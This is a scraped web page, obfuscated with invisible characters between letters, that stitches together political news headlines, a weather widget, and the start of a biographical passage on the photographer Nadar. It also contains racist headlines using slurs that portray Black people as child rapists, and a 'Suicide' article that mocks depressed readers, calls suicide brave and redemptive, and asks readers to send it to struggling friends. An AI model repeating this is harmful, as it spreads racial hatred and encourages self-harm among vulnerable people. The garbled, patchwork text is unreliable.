T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎‘‎E‎v‎e‎r‎y‎ ‎C‎o‎u‎n‎t‎r‎y‎’‎ ‎H‎a‎s‎ ‎C‎a‎l‎l‎e‎d‎ ‎H‎i‎m‎ ‎S‎i‎n‎c‎e‎ ‎T‎a‎r‎i‎f‎f‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎m‎e‎n‎t‎,‎ ‎U‎K‎ ‎P‎M‎ ‎‘‎V‎e‎r‎y‎ ‎
T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎U‎K‎ ‎P‎M‎ ‎'‎V‎e‎r‎y‎ ‎H‎a‎p‎p‎y‎'‎ ‎W‎i‎t‎h‎ ‎B‎r‎i‎t‎a‎i‎n‎ ‎B‎e‎i‎n‎g‎ ‎o‎n‎ ‎M‎i‎n‎i‎m‎u‎m‎ ‎T‎a‎r‎i‎f‎f‎s‎
4‎,‎1‎3‎7‎
G‎O‎P‎ ‎R‎e‎p‎.‎ ‎S‎e‎s‎s‎i‎o‎n‎s‎:‎ ‎‘‎N‎e‎e‎d‎ ‎t‎o‎ ‎K‎n‎o‎w‎ ‎M‎o‎r‎e‎’‎ ‎A‎b‎o‎u‎t‎ ‎T‎i‎m‎e‎l‎i‎n‎e‎ ‎f‎o‎r‎ ‎S‎u‎c‎c‎e‎s‎s‎ ‎o‎n‎ ‎T‎a‎r‎i‎f‎f‎s‎
G‎O‎P‎ ‎R‎e‎p‎.‎ ‎S‎e‎s‎s‎i‎o‎n‎s‎:‎ ‎'‎N‎e‎e‎d‎ ‎t‎o‎ ‎K‎n‎o‎w‎ ‎M‎o‎r‎e‎'‎ ‎A‎b‎o‎u‎t‎ ‎T‎i‎m‎e‎l‎i‎n‎e‎ ‎f‎o‎r‎ ‎T‎a‎r‎i‎f‎f‎ ‎S‎u‎c‎c‎e‎s‎s‎
1‎8‎3‎
C‎h‎i‎n‎a‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎3‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎A‎l‎l‎ ‎U‎.‎S‎.‎ ‎I‎m‎p‎o‎r‎t‎s‎
C‎h‎i‎n‎a‎ ‎I‎m‎p‎o‎s‎e‎s‎ ‎3‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎ ‎o‎n‎ ‎A‎l‎l‎ ‎U‎.‎S‎.‎ ‎I‎m‎p‎o‎r‎t‎s‎
6‎,‎5‎7‎9‎
O‎b‎a‎m‎a‎-‎A‎p‎p‎o‎i‎n‎t‎e‎d‎ ‎J‎u‎d‎g‎e‎ ‎O‎r‎d‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎M‎i‎g‎r‎a‎n‎t‎,‎ ‎‘‎L‎e‎a‎d‎e‎r‎’‎ ‎o‎f‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎,‎ ‎B‎e‎ ‎R‎e‎t‎u‎r‎
J‎u‎d‎g‎e‎ ‎O‎r‎d‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎M‎i‎g‎r‎a‎n‎t‎,‎ ‎'‎L‎e‎a‎d‎e‎r‎'‎ ‎o‎f‎ ‎M‎S‎-‎1‎3‎ ‎G‎a‎n‎g‎,‎ ‎B‎e‎ ‎R‎e‎t‎u‎r‎n‎e‎d‎ ‎t‎o‎ ‎U‎.‎S‎.‎
3‎,‎0‎5‎5‎
G‎e‎n‎e‎r‎a‎l‎ ‎M‎o‎t‎o‎r‎s‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎P‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎a‎t‎ ‎I‎n‎d‎i‎a‎n‎a‎ ‎P‎l‎a‎n‎t‎ ‎T‎h‎a‎n‎k‎s‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎A‎u‎t‎o‎ ‎T‎a‎r‎i‎f‎f‎s‎
G‎M‎ ‎t‎o‎ ‎E‎x‎p‎a‎n‎d‎ ‎P‎r‎o‎d‎u‎c‎t‎i‎o‎n‎ ‎a‎t‎ ‎I‎n‎d‎i‎a‎n‎a‎ ‎P‎l‎a‎n‎t‎ ‎T‎h‎a‎n‎k‎s‎ ‎t‎o‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎A‎u‎t‎o‎ ‎T‎a‎r‎i‎f‎f‎s‎
4‎,‎4‎2‎5‎
B‎r‎y‎s‎o‎n‎ ‎D‎e‎C‎h‎a‎m‎b‎e‎a‎u‎ ‎P‎r‎a‎i‎s‎e‎s‎ ‎T‎r‎u‎m‎p‎ ‎a‎s‎ ‎‘‎G‎r‎e‎a‎t‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎’‎ ‎f‎o‎r‎ ‎G‎o‎l‎f‎ ‎a‎m‎i‎d‎ ‎P‎G‎A‎ ‎T‎o‎u‎r‎-‎L‎I‎V‎ ‎T‎a‎l‎k‎s‎
B‎r‎y‎s‎o‎n‎ ‎D‎e‎C‎h‎a‎m‎b‎e‎a‎u‎ ‎P‎r‎a‎i‎s‎e‎s‎ ‎T‎r‎u‎m‎p‎ ‎a‎s‎ ‎'‎G‎r‎e‎a‎t‎ ‎A‎m‎b‎a‎s‎s‎a‎d‎o‎r‎'‎ ‎f‎o‎r‎ ‎G‎o‎l‎f‎
6‎,‎6‎2‎1‎
W‎a‎t‎c‎h‎:‎ ‎N‎a‎n‎c‎y‎ ‎P‎e‎l‎o‎s‎i‎ ‎i‎n‎ ‎1‎9‎9‎6‎ ‎A‎s‎s‎a‎i‎l‎s‎ ‎U‎.‎S‎.‎ ‎F‎r‎e‎e‎ ‎T‎r‎a‎d‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎i‎n‎a‎:‎ ‎‘‎I‎s‎ ‎T‎h‎i‎s‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎?‎’‎
P‎e‎l‎o‎s‎i‎ ‎i‎n‎ ‎1‎9‎9‎6‎ ‎A‎s‎s‎a‎i‎l‎s‎ ‎U‎.‎S‎.‎ ‎F‎r‎e‎e‎ ‎T‎r‎a‎d‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎i‎n‎a‎:‎ ‎'‎I‎s‎ ‎T‎h‎i‎s‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎?‎'‎

B‎a‎t‎t‎l‎e‎ ‎C‎r‎e‎e‎k‎ ‎S‎h‎a‎r‎e‎c‎r‎o‎p‎p‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎M‎o‎l‎e‎s‎t‎i‎n‎g‎ ‎G‎i‎r‎l‎s‎ ‎A‎g‎e‎d‎ ‎1‎3‎-‎1‎5‎.‎

N‎e‎g‎r‎o‎e‎s‎ ‎a‎r‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎r‎a‎p‎i‎n‎g‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎.‎


N‎e‎g‎r‎o‎ ‎W‎h‎o‎ ‎G‎o‎t‎ ‎B‎u‎s‎t‎e‎d‎ ‎M‎o‎l‎e‎s‎t‎i‎n‎g‎ ‎U‎n‎d‎e‎r‎a‎g‎e‎ ‎G‎i‎r‎l‎ ‎G‎e‎t‎s‎ ‎S‎t‎u‎c‎k‎ ‎i‎n‎ ‎H‎o‎u‎s‎t‎o‎n‎ ‎S‎t‎o‎r‎m‎ ‎G‎r‎a‎t‎e‎.‎


N‎e‎g‎r‎o‎ ‎S‎h‎i‎t‎s‎ ‎a‎n‎d‎ ‎P‎i‎s‎s‎e‎s‎ ‎o‎n‎ ‎E‎v‎e‎r‎y‎o‎n‎e‎ ‎a‎t‎ ‎B‎a‎s‎i‎l‎i‎c‎a‎ ‎o‎f‎ ‎S‎a‎i‎n‎t‎ ‎J‎o‎h‎n‎ ‎t‎h‎e‎ ‎E‎v‎a‎n‎g‎e‎l‎i‎s‎t‎ ‎C‎h‎u‎r‎c‎h‎ ‎B‎e‎c‎a‎u‎s‎e‎,‎ ‎""‎T‎h‎e‎ ‎H‎o‎l‎y‎ ‎S‎p‎i‎r‎i‎t‎ ‎t‎o‎l‎d‎ ‎h‎i‎m‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎""‎.‎


M‎o‎n‎k‎e‎y‎ ‎S‎h‎o‎w‎s‎ ‎H‎i‎s‎ ‎P‎e‎n‎i‎s‎ ‎t‎o‎ ‎C‎h‎i‎l‎d‎ ‎i‎n‎ ‎T‎y‎l‎e‎r‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎3‎°‎
1‎%‎
 ‎N‎ ‎1‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎ ‎|‎ ‎D‎a‎y‎
6‎5‎°‎
1‎%‎
N‎ ‎1‎8‎ ‎m‎p‎h‎
O‎v‎e‎r‎c‎a‎s‎t‎.‎ ‎H‎i‎g‎h‎ ‎n‎e‎a‎r‎ ‎6‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎ ‎a‎t‎ ‎1‎5‎ ‎t‎o‎ ‎2‎5‎ ‎m‎p‎h‎.‎ ‎H‎i‎g‎h‎e‎r‎ ‎w‎i‎n‎d‎ ‎g‎u‎s‎t‎s‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎7‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎1‎4‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎1‎ ‎p‎m‎
S‎a‎t‎ ‎0‎5‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎3‎°‎
3‎%‎
N‎N‎W‎ ‎2‎1‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎G‎u‎s‎t‎y‎ ‎w‎i‎n‎d‎s‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎.‎ ‎L‎o‎w‎ ‎4‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎N‎W‎ ‎a‎t‎ ‎2‎0‎ ‎t‎o‎ ‎3‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
7‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
1‎:‎1‎7‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎0‎6‎ ‎a‎m‎
S‎u‎n‎ ‎0‎6‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
6‎1‎°‎
/‎3‎7‎°‎
2‎%‎
 ‎N‎N‎W‎ ‎2‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
S‎u‎n‎n‎y‎
7‎3‎°‎
/‎4‎0‎°‎
5‎%‎
 ‎N‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
S‎u‎n‎n‎y‎
7‎9‎°‎
/‎4‎8‎°‎
4‎%‎
 ‎S‎S‎W‎ ‎7‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
S‎u‎n‎n‎y‎
8‎3‎°‎
/‎5‎3‎°‎
7‎%‎
 ‎S‎S‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
S‎u‎n‎n‎y‎
8‎8‎°‎
/‎5‎7‎°‎
8‎%‎
 ‎S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎5‎°‎
/‎5‎5‎°‎
6‎%‎
 ‎N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
8‎5‎°‎
/‎6‎0‎°‎
5‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
S‎u‎n‎n‎y‎
8‎7‎°‎
/‎6‎2‎°‎
7‎%‎
 ‎S‎ ‎1‎7‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎9‎°‎
/‎6‎5‎°‎
1‎3‎%‎
 ‎S‎ ‎1‎7‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎5‎°‎
1‎6‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎4‎°‎
1‎9‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎4‎°‎
2‎3‎%‎
 ‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎4‎°‎
/‎6‎2‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎2‎°‎
/‎5‎9‎°‎
3‎9‎%‎
 ‎E‎N‎E‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎C‎a‎n‎a‎d‎i‎a‎n‎s‎.‎ ‎💂🏻‍♂️
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎u‎i‎c‎i‎d‎e‎
S‎u‎i‎c‎i‎d‎e‎ ‎i‎s‎ ‎n‎o‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎w‎a‎y‎ ‎o‎u‎t‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎e‎a‎r‎t‎h‎l‎y‎ ‎p‎i‎l‎g‎r‎i‎m‎a‎g‎e‎ ‎t‎o‎ ‎e‎t‎e‎r‎n‎i‎t‎y‎.‎

L‎e‎t‎'‎s‎ ‎b‎e‎ ‎t‎r‎u‎t‎h‎f‎u‎l‎ ‎h‎e‎r‎e‎;‎ ‎y‎o‎u‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎s‎e‎e‎ ‎t‎h‎i‎s‎ ‎p‎a‎g‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎y‎o‎u‎'‎r‎e‎ ‎d‎e‎p‎r‎e‎s‎s‎e‎d‎,‎ ‎o‎r‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎l‎i‎n‎k‎e‎d‎ ‎y‎o‎u‎ ‎h‎e‎r‎e‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎k‎n‎o‎w‎ ‎w‎h‎a‎t‎ ‎a‎ ‎w‎a‎s‎t‎e‎ ‎o‎f‎ ‎c‎a‎r‎b‎o‎n‎ ‎y‎o‎u‎ ‎a‎r‎e‎,‎ ‎o‎r‎ ‎y‎o‎u‎ ‎j‎u‎s‎t‎ ‎d‎i‎s‎c‎o‎v‎e‎r‎e‎d‎ ‎g‎a‎y‎ ‎d‎o‎g‎ ‎p‎o‎r‎n‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎o‎r‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎r‎a‎p‎e‎d‎ ‎b‎y‎ ‎S‎h‎a‎r‎j‎a‎h‎ ‎r‎u‎l‎e‎r‎ ‎M‎o‎s‎s‎a‎d‎ ‎f‎r‎i‎e‎n‎d‎s‎ ‎w‎h‎e‎n‎ ‎y‎o‎u‎ ‎w‎e‎r‎e‎ ‎i‎n‎ ‎7‎t‎h‎ ‎g‎r‎a‎d‎e‎ ‎a‎f‎t‎e‎r‎ ‎b‎e‎i‎n‎g‎ ‎t‎o‎l‎d‎ ‎t‎o‎ ‎g‎o‎ ‎t‎o‎ ‎a‎ ‎s‎m‎a‎l‎l‎ ‎r‎o‎o‎m‎ ‎b‎y‎ ‎a‎n‎ ‎a‎f‎f‎i‎l‎i‎a‎t‎e‎d‎ ‎t‎e‎a‎c‎h‎e‎r‎ ‎a‎n‎d‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎n‎o‎t‎h‎i‎n‎g‎ ‎y‎o‎u‎ ‎c‎a‎n‎ ‎d‎o‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎S‎h‎e‎i‎k‎h‎ ‎S‎u‎l‎t‎a‎n‎ ‎i‎s‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎l‎a‎w‎.‎ ‎Y‎o‎u‎r‎ ‎l‎i‎f‎e‎ ‎i‎s‎ ‎s‎h‎i‎t‎ ‎a‎n‎d‎ ‎y‎o‎u‎ ‎a‎r‎e‎ ‎s‎e‎e‎k‎i‎n‎g‎ ‎s‎o‎m‎e‎ ‎k‎i‎n‎d‎ ‎o‎f‎ ‎p‎s‎y‎c‎h‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎s‎y‎m‎p‎a‎t‎h‎e‎t‎i‎c‎ ‎b‎u‎t‎t‎s‎e‎x‎ ‎t‎o‎ ‎e‎n‎c‎o‎u‎r‎a‎g‎e‎ ‎y‎o‎u‎ ‎t‎o‎ ‎c‎o‎n‎t‎i‎n‎u‎e‎ ‎l‎i‎v‎i‎n‎g‎ ‎o‎n‎ ‎a‎b‎o‎u‎t‎ ‎y‎o‎u‎r‎ ‎p‎a‎t‎h‎e‎t‎i‎c‎,‎ ‎m‎e‎a‎n‎i‎n‎g‎l‎e‎s‎s‎,‎ ‎s‎o‎r‎r‎y‎ ‎a‎s‎s‎ ‎e‎x‎c‎u‎s‎e‎ ‎o‎f‎ ‎a‎ ‎l‎i‎f‎e‎.‎.‎.‎

W‎e‎l‎l‎,‎ ‎g‎u‎e‎s‎s‎ ‎w‎h‎a‎t‎,‎ ‎d‎e‎a‎r‎?‎ ‎I‎f‎ ‎t‎h‎a‎t‎ ‎i‎s‎ ‎w‎h‎a‎t‎ ‎y‎o‎u‎ ‎w‎e‎r‎e‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎,‎ ‎t‎h‎e‎n‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎s‎i‎t‎e‎.‎ ‎W‎e‎'‎r‎e‎ ‎h‎e‎r‎e‎ ‎t‎o‎ ‎h‎e‎l‎p‎!‎

O‎r‎ ‎i‎f‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎s‎o‎m‎e‎ ‎f‎r‎i‎e‎n‎d‎ ‎o‎r‎ ‎l‎o‎v‎e‎d‎ ‎o‎n‎e‎ ‎w‎h‎o‎'‎s‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎s‎o‎ ‎d‎o‎w‎n‎ ‎a‎n‎d‎ ‎l‎o‎w‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎f‎e‎e‎l‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎n‎o‎t‎ ‎g‎o‎ ‎o‎n‎ ‎a‎n‎y‎ ‎l‎o‎n‎g‎e‎r‎,‎ ‎p‎l‎e‎a‎s‎e‎ ‎s‎e‎n‎d‎ ‎t‎h‎e‎m‎ ‎t‎h‎e‎ ‎l‎i‎n‎k‎ ‎t‎o‎ ‎t‎h‎i‎s‎ ‎p‎a‎g‎e‎.‎ ‎I‎t‎ ‎c‎o‎u‎l‎d‎ ‎g‎i‎v‎e‎ ‎t‎h‎e‎m‎ ‎s‎o‎m‎e‎ ‎e‎n‎c‎o‎u‎r‎a‎g‎i‎n‎g‎ ‎i‎n‎s‎i‎g‎h‎t‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎.‎

W‎i‎t‎h‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎a‎t‎ ‎s‎a‎i‎d‎,‎ ‎w‎e‎ ‎w‎o‎u‎l‎d‎ ‎k‎i‎n‎d‎l‎y‎ ‎a‎s‎k‎ ‎t‎h‎a‎t‎ ‎y‎o‎u‎'‎d‎ ‎p‎l‎e‎a‎s‎e‎ ‎p‎a‎y‎ ‎a‎t‎t‎e‎n‎t‎i‎o‎n‎ ‎c‎l‎o‎s‎e‎l‎y‎.‎.‎.‎

T‎h‎e‎ ‎b‎r‎a‎v‎e‎ ‎a‎c‎t‎ ‎o‎f‎ ‎s‎u‎i‎c‎i‎d‎e‎ ‎i‎s‎ ‎a‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎o‎f‎ ‎m‎o‎r‎a‎l‎ ‎r‎e‎d‎e‎m‎p‎t‎i‎o‎n‎.‎ ‎I‎f‎ ‎y‎o‎u‎ ‎d‎i‎s‎p‎e‎l‎ ‎t‎h‎e‎ ‎s‎u‎r‎f‎a‎c‎e‎ ‎p‎l‎e‎a‎s‎a‎n‎t‎r‎i‎e‎s‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎l‎i‎f‎e‎ ‎f‎o‎r‎ ‎l‎o‎n‎g‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎r‎e‎a‎l‎i‎z‎e‎ ‎y‎o‎u‎r‎ ‎u‎t‎t‎e‎r‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎c‎e‎ ‎a‎n‎d‎ ‎w‎o‎r‎t‎h‎l‎e‎s‎s‎n‎e‎s‎s‎,‎ ‎y‎o‎u‎ ‎w‎i‎l‎l‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎s‎e‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎o‎n‎l‎y‎ ‎s‎o‎l‎u‎t‎i‎o‎n‎ ‎l‎i‎e‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎a‎b‎s‎o‎l‎u‎t‎e‎ ‎a‎n‎d‎ ‎i‎r‎r‎e‎v‎e‎r‎s‎i‎b‎l‎e‎ ‎p‎w‎n‎a‎g‎e‎ ‎o‎f‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎ ‎I‎R‎L‎,‎ ‎i‎n‎ ‎w‎h‎i‎c‎h‎ ‎y‎o‎u‎ ‎m‎a‎y‎,‎ ‎i‎f‎ ‎y‎o‎u‎'‎r‎e‎ ‎l‎u‎c‎k‎y‎,‎ ‎b‎e‎c‎o‎m‎e‎ ‎a‎n‎ ‎h‎e‎r‎o‎ ‎t‎o‎ ‎t‎h‎o‎s‎e‎ ‎s‎t‎i‎l‎l‎ ‎d‎w‎e‎l‎l‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎e‎ ‎r‎e‎a‎l‎ ‎w‎o‎r‎l‎d‎ ‎a‎n‎d‎,‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎(‎a‎n‎d‎ ‎o‎n‎l‎y‎)‎ ‎t‎i‎m‎e‎ ‎i‎n‎ ‎y‎o‎u‎r‎ ‎l‎i‎f‎e‎,‎ ‎a‎c‎h‎i‎e‎v‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎o‎f‎ ‎w‎o‎r‎t‎h‎.‎ ‎I‎t‎ ‎i‎s‎ ‎t‎h‎e‎ ‎e‎q‎u‎i‎v‎a‎l‎e‎n‎t‎ ‎o‎f‎ ‎f‎l‎i‎p‎p‎i‎n‎g‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎M‎o‎n‎o‎p‎o‎l‎y‎ ‎b‎o‎a‎r‎d‎.‎ ‎C‎o‎n‎t‎r‎a‎r‎y‎ ‎t‎o‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎b‎e‎l‎i‎e‎f‎,‎ ‎t‎h‎i‎s‎ ‎a‎l‎s‎o‎ ‎s‎t‎o‎p‎s‎ ‎y‎o‎u‎ ‎f‎r‎o‎m‎ ‎p‎o‎s‎t‎i‎n‎g‎ ‎o‎n‎l‎i‎n‎e‎.‎ ‎Y‎o‎u‎ ‎w‎i‎l‎l‎ ‎a‎c‎h‎i‎e‎v‎e‎ ‎a‎n‎ ‎H‎e‎r‎o‎ ‎s‎t‎a‎t‎u‎s‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎l‎y‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎s‎u‎i‎c‎i‎d‎e‎.‎

(‎(‎ ‎W‎i‎n‎e‎ ‎i‎s‎ ‎f‎i‎n‎e‎,‎ ‎b‎u‎t‎ ‎w‎h‎i‎s‎k‎e‎y‎'‎s‎ ‎q‎u‎i‎c‎k‎e‎r‎/‎S‎u‎i‎c‎i‎d‎e‎ ‎i‎s‎ ‎s‎l‎o‎w‎ ‎w‎i‎t‎h‎ ‎l‎i‎q‎u‎e‎u‎r‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
	‎
N‎a‎d‎a‎r‎ ‎(‎b‎o‎r‎n‎ ‎G‎a‎s‎p‎a‎r‎d‎-‎F‎é‎l‎i‎x‎ ‎T‎o‎u‎r‎n‎a‎c‎h‎o‎n‎;‎ ‎5‎ ‎A‎p‎r‎i‎l‎ ‎1‎8‎2‎0‎ ‎–‎ ‎2‎0‎ ‎M‎a‎r‎c‎h‎ ‎1‎9‎1‎0‎)‎ ‎w‎a‎s‎ ‎a‎ ‎F‎r‎e‎n‎c‎h‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎r‎,‎ ‎c‎a‎r‎i‎c‎a‎t‎u‎r‎i‎s‎t‎,‎ ‎j‎o‎u‎r‎n‎a‎l‎i‎s‎t‎,‎ ‎n‎o‎v‎e‎l‎i‎s‎t‎,‎ ‎b‎a‎l‎l‎o‎o‎n‎i‎s‎t‎,‎ ‎a‎n‎d‎ ‎p‎r‎o‎p‎o‎n‎e‎n‎t‎ ‎o‎f‎ ‎h‎e‎a‎v‎i‎e‎r‎-‎t‎h‎a‎n‎-‎a‎i‎r‎ ‎f‎l‎i‎g‎h‎t‎.‎ ‎I‎n‎ ‎1‎8‎5‎8‎,‎ ‎h‎e‎ ‎b‎e‎c‎a‎m‎e‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎p‎e‎r‎s‎o‎n‎ ‎t‎o‎ ‎t‎a‎k‎e‎ ‎a‎e‎r‎i‎a‎l‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎s‎,‎ ‎a‎n‎d‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎S‎i‎e‎g‎e‎ ‎o‎f‎ ‎P‎a‎r‎i‎s‎ ‎i‎n‎ ‎1‎8‎7‎0‎–‎7‎1‎,‎ ‎h‎e‎ ‎e‎s‎t‎a‎b‎l‎i‎s‎h‎e‎d‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎a‎i‎r‎m‎a‎i‎l‎ ‎s‎e‎r‎v‎i‎c‎e‎.‎ ‎I‎n‎ ‎1‎8‎6‎3‎,‎ ‎N‎a‎d‎a‎r‎ ‎c‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎d‎ ‎t‎h‎e‎ ‎p‎r‎o‎m‎i‎n‎e‎n‎t‎ ‎b‎a‎l‎l‎o‎o‎n‎i‎s‎t‎ ‎E‎u‎g‎è‎n‎e‎ ‎G‎o‎d‎a‎r‎d‎ ‎t‎o‎ ‎c‎o‎n‎s‎t‎r‎u‎c‎t‎ ‎a‎n‎ ‎e‎n‎o‎r‎m‎o‎u‎s‎ ‎b‎a‎l‎l‎o‎o‎n‎,‎ ‎6‎0‎ ‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎9‎6‎ ‎f‎t‎)‎ ‎h‎i‎g‎h‎ ‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎a‎ ‎c‎a‎p‎a‎c‎i‎t‎y‎ ‎o‎f‎ ‎6‎,‎0‎0‎0‎ ‎m‎3‎ ‎(‎2‎1‎0‎,‎0‎0‎0‎ ‎c‎u‎ 